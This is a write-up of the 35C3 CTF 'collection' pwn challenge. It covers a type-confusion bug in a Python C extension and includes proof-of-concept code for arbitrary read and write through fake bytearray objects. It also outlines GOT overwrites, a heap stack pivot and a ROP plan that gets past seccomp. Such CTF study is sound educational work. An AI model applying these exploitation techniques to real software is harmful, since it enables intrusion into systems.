# 35C3 CTF: Collection

For the 35C3 CTF I solved the challenge 'collection' (pwn/easy)

Although the vulnerability was very easy, it was difficult to find. There were a few reasons for this.

First, it required some knowledge about the Python-C-API.
Second, there was another working vulnerability that discouraged me to look for the easy one. (zero refcount double free) Later by other teams' writeups I realized that the intended one was by using zero refcount but during the CTF I thought this was the result of lazy coding and didn't consider it an intended vulnerability.

Simply the vulnerability is due to the misuse of type_handlers. Type_handler is a structure used to store the types within a collection. If an object is an int, the collection object stores it as a C Int instead of an object. If an int entry is misunderstood as a list or dictionary entry, we can access arbitrary, user controlled pointers which is an extremely powerful primitive.

## A few structs

To understand the vulnerability we must know a few structs defined. After reverse engineering the `Collection.cpython-36m-x86_64-linux-gnu.so` file containing the Collection module, I figured out how it functions.

The main structure used is the Collection structure. 

```
struct Collection{
	size_t ob_refcnt;
	PyTypeObject* type;
	type_handler* handler;
}
```

`ob_refcnt` is a variable used for garbage collection. Although it was irrevelevant to the solution, there was a bug with refcnt.

```
struct type_handler{
	list* list;
	size_t refcnt;
}
```

`refcnt` has no importance, since it doesn't affect control flow.

```
struct list{
	node* head;
	node* tail;
	int size;
}
```

The list struct is allocated using malloc(8), so I thought this was a heap overflow vulnerability but it wasn't. Due to heap allignment only the prev_size of the next chunk was overwritten and I couldn't find a way to exploit this.

```
struct node{
	record* rec;
	node* next;
}
```

```
struct record{
	char* name;
	int type;
}
```

The Collection module provides a Collection class which is like a container. The __init__ method takes a dictionary whose keys must be all strings and properties must be one of the following: list, dictionary, python int (long).

Each Collection() has a type_handler, which is used to list what types it contains. type_handler has a list where each node contains information (name, type)

Now, the vulnerability lies in the fact that type_handler is cached and can be used by other Collections if the types are equal. What do you mean by types are equal? It is defined in a function called IsListEqual, and a new type handler is generated only if there is no matching cached type handler. When judging if a type_handler can be used for a Collection, the order of the objects do not matter. However when using the get() method to take out objects it matters, because based on what type an object is the extraction method differs. If we can make an object take a type_handler that is different from its types we can cause unexpected behavior to occur.

## Getting Arbitrary R/W

Below is the PoC. Let's think about how it's supposed to work.

```
def arbitrary_read(addr,start,end):
	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
	structaddr = id(fakestruct) + 0x48
	#print("[*] target: 0x%x"%addr)
	c1 = Collection.Collection({"a":[],"a\x00":structaddr})
	c2 = Collection.Collection({"a":structaddr,"a\x00":[]})#INT->LIST
	x = c2.get("a")#GET ARBITRARY ADDRESS AS AN OBJECT
	return x[start:end]
```

```
def arbitrary_write(addr,offset,ch):
	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
	structaddr = id(fakestruct) + 0x48
	#print("[*] target: 0x%x"%addr)
	c1 = Collection.Collection({"a":[],"a\x00":structaddr})
	c2 = Collection.Collection({"a":structaddr,"a\x00":[]})#INT->LIST
	x = c2.get("a")#GET ARBITRARY ADDRESS AS AN OBJECT
	x[offset]=ch
```

The PoC uses the vulnerability lying in the get method.

```
PyObject * Collection__get(PyObject *self, PyObject *args)
{
  char *v4; // rsi
  signed int idx; // eax
  int i; // rcx
  node *nn; // rdx
  record *v8; // rdx
  void *result; // rax
  char *name; // [rsp+0h] [rbp-18h]
  unsigned __int64 v11; // [rsp+8h] [rbp-10h]

  if ( !PyArg_ParseTuple(args, "s", &name) || self->ob_type != &module && !PyType_IsSubtype() )

  {
    return &Py_NoneStruct;
  }

  _name = name;
  idx = listIndexOf(self->type_handler->list, name,recordNameComparator);

  if ( idx == -1 )
    return &Py_NoneStruct;

  cur = self->type_handler->list->head;
  if ( cur && idx > 0 )
  {
    i = 0;
    do
    {
      cur = cur->next;
      i++;
    }
    while ( cur && idx > i );
  }
  rec = (record *)cur->value;
  result = self->elements[idx];
  if ( rec->type == 1 )                          // integer
    result = (PyObject *)PyLong_FromLong(result);
  return result;
}
```

All PyLong objects are stored in C unsigned long form instead of the pointer to the PyLongObject struct. If we can get a PyLong entry to have a type other than 1, we can make the get() method return an arbitrary pointer. 

We can do this by creating a type_handler containing a int entry and a list entry. If we switch the order of them and re-create a Collection object it will use the same type_handler but using get() to take out the list will result in returning the value of the int as a pointer. Let's take a look at how a type_handler is allocated for a new Collection class.

```
struct handler * getTypeHandler(list *list)
{
  int idx; 
  struct handler *handle;
  handler *result;

  idx = 0;
  do
  {
    handler = handlers[idx];
    if ( handler )
    {
      if ( listIsEquivalent(handler->list, list, recordComparator) )
      {
        result = handlers[idx];
        ++result->usage_cnt;        
        return result;
      }
    }
    ++idx;
  }
  while ( idx != 256 );
  return createTypeHandler(handler, list);
}
```

Quite simple. handlers is a global buffer containing up to 256 pointers. It iterates through the handlers and checks if there is a usable (Equivalent) handler and if there is one it returns that handler. If no usable handler is found it creates a new one. Then, how does listIsEquivalent() work?

```
bool listIsEquivalent(list *l1, list *l2, int(*)(void*,void*) cmp_function)
{
  list *sorted_l1;
  list *sorted_l2;

  if ( l1->size != l2->size )
    return 0LL;

  l1 = listSort(l2,cmp_function);
  l2 = listSort(l1,cmp_function);
  return listEqual(sorted_l1, sorted_l2, cmp_function);
```

Simple. The two lists are sorted and then checked if identical. The vulnerability is right here. The handler's order of items can be different from the struct PyObject->elements list. We can make get() confuse the type of an element and trigger the arbitrary pointer access vulnerability. Now we can understand the PoC script. I created two Collection instances that shares the type handler. Howerver, the type of elements[0] differs in each instance, but in get() it will be considered as the type defined in the instance defined earlier. We can fake an C Int directly to a PyObject * pointer without converting it to a PyLong Object. 

We can get a full arbitrary RW by using bytearrays. There is a member in the bytearray struct that holds its buffer, and by forging a value for that member we can get arbitrary RW. A more detailed exploit plan is the following:

(1) In a string create a fake bytearray struct whose buffer is the pointer we want to read or write to.
(2) Get the address of the fake structure by using id(stringobject)+0x48 (The real data part comes out 0x48 bytes after the PyObject structure)
(3) Create collection instances so that get returns the fake bytearray object.

## Gaining RCE

Now that we have an arbitrary RW primitive, what can we do? Unlinke in challenges where you overwrite malloc_hook with one_gadget and a shell is obtained, we need complex control flow manipulation in this case. That is because of all of the SECCOMP restrictions on the binary. I used david942j's one_gadget to analyze seccomp filters.

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0012
 0011: 0x05 0x00 0x00 0x00000011  goto 0029
 0012: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000019  if (A != mremap) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x000000ca  if (A != futex) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000083  if (A != sigaltstack) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0026
 0025: 0x05 0x00 0x00 0x00000037  goto 0081 #write syscall
 0026: 0x15 0x00 0x01 0x0000000d  if (A != rt_sigaction) goto 0028
 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0028: 0x06 0x00 0x00 0x00000000  return KILL
 0029: 0x05 0x00 0x00 0x00000000  goto 0030
 0030: 0x20 0x00 0x00 0x00000010  A = args[0]
 0031: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0032: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
 0033: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0034: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0038
 0035: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0036: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0039
 0037: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0038: 0x06 0x00 0x00 0x00000000  return KILL
 0039: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0040: 0x20 0x00 0x00 0x00000020  A = args[2]
 0041: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0042: 0x20 0x00 0x00 0x00000024  A = args[2] >> 32
 0043: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0044: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0048
 0045: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0046: 0x15 0x02 0x00 0x00000003  if (A == 0x3) goto 0049
 0047: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0048: 0x06 0x00 0x00 0x00000000  return KILL
 0049: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0050: 0x20 0x00 0x00 0x00000028  A = args[3]
 0051: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0052: 0x20 0x00 0x00 0x0000002c  A = args[3] >> 32
 0053: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0054: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0058
 0055: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0056: 0x15 0x02 0x00 0x00000022  if (A == 0x22) goto 0059
 0057: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0058: 0x06 0x00 0x00 0x00000000  return KILL
 0059: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0060: 0x20 0x00 0x00 0x00000030  A = args[4]
 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0062: 0x20 0x00 0x00 0x00000034  A = args[4] >> 32
 0063: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0064: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0068
 0065: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0066: 0x15 0x02 0x00 0xffffffff  if (A == 0xffffffff) goto 0069
 0067: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0068: 0x06 0x00 0x00 0x00000000  return KILL
 0069: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0070: 0x20 0x00 0x00 0x00000038  A = args[5]
 0071: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0072: 0x20 0x00 0x00 0x0000003c  A = args[5] >> 32
 0073: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0074: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0078
 0075: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0076: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0079
 0077: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0078: 0x06 0x00 0x00 0x00000000  return KILL
 0079: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0080: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0081: 0x05 0x00 0x00 0x00000000  goto 0082
 0082: 0x20 0x00 0x00 0x00000010  A = args[0] #sys_write
 0083: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0084: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
 0085: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0086: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0092
 0087: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0088: 0x15 0x00 0x02 0x00000001  if (A != 0x1) goto 0091
 0089: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0090: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0091: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0092: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0098
 0093: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0094: 0x15 0x00 0x02 0x00000002  if (A != 0x2) goto 0097
 0095: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0096: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0097: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0098: 0x06 0x00 0x00 0x00000000  return KILL
```

Also, to keep the challenge from turning into a silly, misc-style pyjail escape challenge the author added a code to patch the python binary and remove a feature from it.
```
PyObject *PyInit_Collection()
{
  PyObject * module;

  if ( PyType_Ready(&module) < 0 )
    return 0LL;

  module = (PyObject *)PyModule_Create2(&module_definition, 1013);// 1013 is module_api_version

  if ( module )
  {
    ++module.ob_refcnt;
    PyModule_AddObject(module, "Collection", &module);

    mprotect((void *)0x439000, 1uLL, 7);
    memcpy((void*)0x43968F,&int3_seq,0x10);
    memcpy((void*)0x43969F,&int3_seq,0x10);
    mprotect((void *)0x439000, 1uLL, 5);

    init_sandbox();
  }
  return module;
}
```

Looking at the address I figured out that 0x43968F is the address of the code that handles os.readv() function. By patching this to a "\xCC" sequence (int3) the author prevented the attacker from using os.readv() to solve the challenge without memory corruption.

#### side note
We could retrieve important python builtins using the following code. I'll skip the explanations for them.
```
sys = modules['sys']
os = modules['os.path'].os

for x in ().__class__.__base__.__subclasses__():
  if x.__name__ == 'bytearray':
    bytearray = x
    break
```

The flag is located in fd 1023 and we only have readv, mmap, and write to load the contents and show it. However I decided to use readv and write because mmap had special constraints to it via seccomp. We cannot use a one_gadget because execve is forbidden. We need a ROP to call all those functions with carefully set arguments. How to we do ROP when there is no stack overflow? We pivot the stack to the heap.

At first I created a ROP chain that works only on the debugger. After adjusting a few offsets I succeeded to read the flag in the local environment. However the exploit failed on the local environment and I decided to write an exploit that always works.

My plan is to defeat ASLR using abitrary read. I used the struct link_map structure located at .got.plt+0x8, which is a structure used to map all the shared objects. Using this I decided to find the `Collection.cpython-36m-x86_64-linux-gnu.so`'s base address.

#### side note
All libraries are mmaped adjacent to each other but there were other shared libraries (such as libpthread) linked as well. Therefore the offset could be different in the local and remote environment since libpthread and other libraries' size would be different.

```
struct link_map{
  ElfW(Addr) l_addr;
  char *l_name;
  ElfW(Dyn) *l_ld;
  struct link_map *l_next,*l_prev;
}
```

First we read the struct link_map at the static location 0x9B3008, and iterate through the linked list until we get `Collection.cpython-36m-x86_64-linux-gnu.so`. Now we can use gadgets in libc.so.6 and `Collection.cpython-36m-x86_64-linux-gnu.so`.

The reason I tried to use gadgets in `Collection.cpython-36m-x86_64-linux-gnu.so` is because triggering code in `Collection.cpython-36m-x86_64-linux-gnu.so` is much controllable compared to the one in python3.6 for many reasons. First, we do not know if some automatic routine might reuse overwritten GOT values. Also, we do not fully understand how python internals work but we fully understood the functionalities of Colleciton.so. 

First, we need FULL-register control and we can acheive that by arguments passed by registers. The most easiest one was the PyLong_FromLong and its RDI register is user-controlled. I also found this code segment:

```
1db2: 48 89 fd              mov    %rdi,%rbp
1db5: 89 f3                 mov    %esi,%ebx
1db7: bf 10 00 00 00        mov    $0x10,%edi
1dbc: 48 83 ec 08           sub    $0x8,%rsp
1dc0: e8 db f4 ff ff        callq  12a0 <malloc@plt>
```

Now if we change malloc_got to a leave; ret gadget we get to control the stack frame, and perform a ROP. Let's summarize the primitives again:

```
(0) Create a string object with the ROP chain. By using id() we can get the exact address of the ROP chain and save it into the variable fake_stack_addr. (the real address of the string was at an address a bit higher than the PyObject address.)
(1) Create a collection object like the following: Collection.Collection({"abcd":fake_stack_addr})
(2) Get the base address of `Collection.cpython-36m-x86_64-linux-gnu.so` (let's call this CLIB)
(3) Overwrite PyLong_FromLong GOT to CLIB + 0x1db2
(4) Overwrite malloc GOT to a leave;ret gadget
(5) Trigger the ROP using get("abcd")
```

Now we get RCE via ROP. The ROP chain building part is trivial (we have so many gadgets to use!) so I'll skip the explanation of it. Exploit details can be found in exploit.py

# Overall

Due to some tragic conditions (connection blocked to the netcat server) I couldn't get the flag during the CTF even though I fully wrote the exploit. Howerver I still learned a lot of things such as memory management in Python and triggering ROP in very large binaries. I think this was a very unique challenge and I hope to see these kinds of challenges again in the future. Maybe I can find some vulnerabilities in well-known python C libraries like Numpy or PIL?

Flag: `35C3_l1st_equiv4lency_is_n0t_l15t_equ4l1ty`
